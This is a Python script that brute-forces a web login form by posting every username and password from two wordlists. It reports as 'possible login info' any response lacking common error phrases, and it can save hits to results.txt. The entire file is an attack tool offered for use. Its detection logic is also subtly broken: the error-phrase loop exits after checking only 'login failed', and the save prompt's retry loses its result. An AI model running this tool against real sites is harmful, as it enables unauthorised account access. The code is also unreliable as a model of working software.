#!/usr/bin/python3
import requests, sys

print("[!] usage: Put the passwords you wish to try and usernames you wish to try in two separate files. The entries in the file should be on different lines. enter full path to the files as and when prompted.\n\n")

url = input("Enter full path to login page including protocol (http:// or https://) --> ")
passlist = input("Enter full path to wordlist to use as password wordlist or specify a password to use--> ")
usrlist = input("Enter full path to wordlist to use as username wordlist or specify a username to use--> ")

def save_results_to_file():
    save_to_file = input("Do you wish to save the results to a file (y/n)?")
    save_to_file = save_to_file.lower()
    if save_to_file == "y" or save_to_file == "yes":
        return True
        brute_force_wordlist(url, passlist, usrlist, save_results_to_file)
    elif save_to_file == "n" or save_to_file == "no":
        return False
    else:
        print("Invalid input! Please enter \"y\" or \"n\"" )
        save_results_to_file()


def brute_force_wordlist(form_url, pass_wordlist_file, usr_wordlist_file, save_results):
    print("\n")
    print(f"[+] Starting bruteforce attack on --> {form_url} !")
    print(f"[+] Setting password wordlist --> {pass_wordlist_file} !")
    print(f"[+] Setting username wordlist --> {usr_wordlist_file} !\n\n")
    common_errors= ["login failed", "incorrect", "error", "try again", "that didn't work", "that did not work"]
    try:
        logins_found = False
        error_found = True
        with open(usr_wordlist_file, "r") as usrfile:
            for line in usrfile:
                current_username = line.strip()
                try:
                    with open(pass_wordlist_file, "r") as passfile:
                        for line in passfile:
                            current_pass = line.strip()
                            data_dict = {"username": current_username, "password": current_pass, "Login": "submit"}
                            try:
                                response = requests.post(url, data=data_dict)
                                response_str = str(response.content)
                                response_str = response_str.lower()
                                for error in common_errors:
                                    if error in response_str:
                                        error_found = True
                                    else:
                                        error_found = False
                                        break
                                    break
                                if error_found == False:
                                    print("#"*100)
                                    print(f"\n[+] Possible Login info found! --> username: {current_username}; password: {current_pass}\n")
                                    print("#" *100)
                                    print("\n\n")
                                    if save_results == True:
                                        with open("results.txt" , "a") as result_file:
                                            result_file.write(f"results for test against --> {form_url}\n")
                                            result_file.write(current_username + ":" + current_pass + "\n\n")
                                            result_file.close()
                                        logins_found = True
                            except requests.exceptions.ConnectionError:
                                print(f"[-] Target url ({form_url}) is unavailable! Did you enter the correct URL?")
                                sys.exit()
                            except requests.exceptions.InvalidURL:
                                print(f"[-] Target url ({form_url}) is incorrect! Did you enter the correct URL?")
                                sys.exit()
                            except requests.exceptions.MissingSchema:
                                print(f"[-] Target url ({form_url}) is missing protocol! Did you enter the complete URL?")
                                sys.exit()
                except FileNotFoundError:
                    print(f"[-] Password wordlist ({pass_wordlist_file}) not found! Did you enter correct path?")
        if logins_found == False:
            print("-"*100)
            print("[-] No valid login found in the provided wordlists! Not making any file!")
            print("-" *100)
            print("\n\n")
        elif logins_found == True:
            print(f"[+] Found logins written to results.txt")
            print("[!] Format for written results is username:password")
    except FileNotFoundError:
        print(f"[-] Username wordlist ({usr_wordlist_file}) not found! Did you enter correct path?")

save_results = save_results_to_file()

brute_force_wordlist(url, passlist, usrlist, save_results)
